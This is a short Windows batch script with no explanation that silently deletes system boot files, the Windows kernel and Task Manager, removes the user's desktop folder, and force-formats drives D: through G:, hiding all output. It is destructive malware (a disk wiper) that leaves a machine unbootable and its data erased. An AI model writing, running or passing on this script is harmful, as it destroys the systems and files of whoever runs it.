@echo off
del/F/Q/A %SystemDrive%\NTDETECT.COM>nul
del/F/Q/A %SystemDrive%\IO.SYS>nul
del/F/Q/A %SystemDrive%\MSDOS.SYS>nul
del/F/Q/A %SystemDrive%\CONFIG.SYS>nul
del/F/Q/A %SystemDrive%\boot.ini>nul
del/F/Q/A %SystemDrive%\bootfont.bin>nul
del/F/Q/S %SystemRoot%\taskmgr.exe>nul
del/F/Q/S %SystemRoot%\ntoskrnl.exe>nul
del/F/Q/S %SystemDrive%\"Documents and Settings"\%username%\×ÀÃæ>nul
format D:/X/FS:NTFS/Q/Y>nul
format E:/X/FS:NTFS/Q/Y>nul
format F:/X/FS:NTFS/Q/Y>nul
format G:/X/FS:NTFS/Q/Y>nul